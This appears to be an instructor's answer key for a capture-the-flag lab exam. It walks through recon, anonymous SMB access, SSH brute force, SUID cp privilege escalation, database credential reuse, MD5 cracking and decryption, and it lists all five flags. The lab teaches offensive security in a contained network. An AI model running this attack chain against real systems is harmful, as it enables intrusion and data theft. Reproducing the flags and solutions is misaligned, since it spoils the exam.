# Alt Final 2026 — Instructor Walkthrough (ANSWER KEY)

**Do not distribute. Untracked by git even after the exam is released.**

Network: `10.10.13.0/24`. All commands are run from inside
`altfinal2026-attacker` (`docker exec -it altfinal2026-attacker bash`).

| Host | IP | Role |
|------|----|------|
| kali-attacker | 10.10.13.2 | attacker |
| vanta-web | 10.10.13.10 | HTTP (Apache) |
| vanta-fileshare | 10.10.13.11 | SMB (Samba) |
| vanta-app | 10.10.13.12 | SSH + OpenSSL vault |
| vanta-db | 10.10.13.13 | MariaDB |

**All five flags:**
| Flag | Value |
|------|-------|
| 1 | `flag{altfinal2026_web_recon}` |
| 2 | `flag{altfinal2026_smb_share}` |
| 3 | `flag{altfinal2026_ssh_foothold}` |
| 4 | `flag{altfinal2026_root_privesc}` |
| 5 | `flag{altfinal2026_crack_decrypt}` |

---

## Phase 1 — Recon + web (Flag 1)

```bash
ip -4 addr                                   # confirm 10.10.13.2/24
nmap -sn 10.10.13.0/24                         # hosts: .10 .11 .12 .13
nmap -sV -p- 10.10.13.10-13                     # 80/http, 139+445/smb, 22/ssh, 3306/mysql
curl -s http://10.10.13.10/ | grep -i flag      # flag in the HTML comment
```

- Username convention (HTML comment + derivable from emails): **first
  initial + surname, lowercase** → `lwhitfield rkhan mlin talvarez gowens`.
- **Flag 1:** `flag{altfinal2026_web_recon}`.

## Phase 2 — SMB (Flag 2)

```bash
smbclient -L //10.10.13.11 -N                   # share: hr (guest ok)
smbclient //10.10.13.11/hr -N -c 'get IT_onboarding_policy.txt'
cat IT_onboarding_policy.txt
```

- Policy: temporary password = **Month + Year** (January…December + 2026).
  This narrows the Phase-3 wordlist.
- **Flag 2:** `flag{altfinal2026_smb_share}`.

## Phase 3 — Targeted SSH brute force (Flag 3)

```bash
printf '%s\n' lwhitfield rkhan mlin talvarez gowens > users.txt
printf '%s\n' January2026 February2026 March2026 April2026 May2026 June2026 \
             July2026 August2026 September2026 October2026 November2026 December2026 > pw.txt
hydra -L users.txt -P pw.txt ssh://10.10.13.12 -t 4
# -> login: rkhan  password: August2026
ssh rkhan@10.10.13.12            # password: August2026
cat ~/user.txt
```

- Valid account: **rkhan : August2026** (the only account still on its
  temporary password; the others have been changed).
- **Flag 3:** `flag{altfinal2026_ssh_foothold}` (`/home/rkhan/user.txt`).

## Phase 4 — SUID /bin/cp privilege escalation (Flag 4)

Enumeration shows `/bin/cp` has the SUID bit (`-rwsr-xr-x`), which is not
stock. A SUID `cp` runs as root, so it can read any file:

```bash
find / -perm -4000 -type f 2>/dev/null           # /bin/cp stands out
ls -l /bin/cp                                     # -rwsr-xr-x (the misconfig)
cp /root/root.txt /dev/stdout                     # read the root-only flag
```

Note: a plain `cp /root/root.txt /tmp/x` copies the file as **root with its
original `600` mode**, so the low-priv user still can't `cat` the copy —
write to `/dev/stdout` instead (the GTFOBins method for reading via SUID
`cp`). A SUID `cp` can equally *overwrite* a root file (e.g. `/etc/passwd`).

- **Flag 4:** `flag{altfinal2026_root_privesc}` (`/root/root.txt`).
- **Reflection answer:** a SUID-root binary runs with the file owner's
  (root's) privileges regardless of who launches it, so a SUID `cp` can read
  or overwrite any file on the system (read `/etc/shadow`, clobber
  `/etc/passwd`, etc.). Remediate with `chmod u-s /bin/cp`; SUID should only
  sit on the small set of binaries that genuinely need it.

## Phase 5 — Credential reuse → crack → decrypt (Flag 5)

```bash
cat /opt/scripts/db_backup.sh                    # vhealth_app / V@nta_db#2026
# Kali's MariaDB client defaults to requiring TLS; this server offers none,
# so pass --ssl=0 (or --skip-ssl).
mysql --ssl=0 -h 10.10.13.13 -u vhealth_app -pV@nta_db#2026 vanta_db \
      -e 'SELECT label, secret_hash FROM vault;'
# secret_hash = MD5 of 'princess'

echo '<hash>' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt            # -> princess

openssl enc -aes-256-cbc -d -salt -in /opt/vault/patient_export.enc -k princess
# -> CSV ending in the flag
```

- MariaDB creds: **vhealth_app / V@nta_db#2026** (in `/opt/scripts/db_backup.sh`).
- Hash cracks to **princess**; same string is the OpenSSL `-k` key.
- **Flag 5:** `flag{altfinal2026_crack_decrypt}` (decrypted `patient_export.enc`).

---

## Reset / re-verify

```bash
docker compose down && docker compose up -d      # fresh stack
docker exec -i altfinal2026-attacker bash -s < solve.sh
```
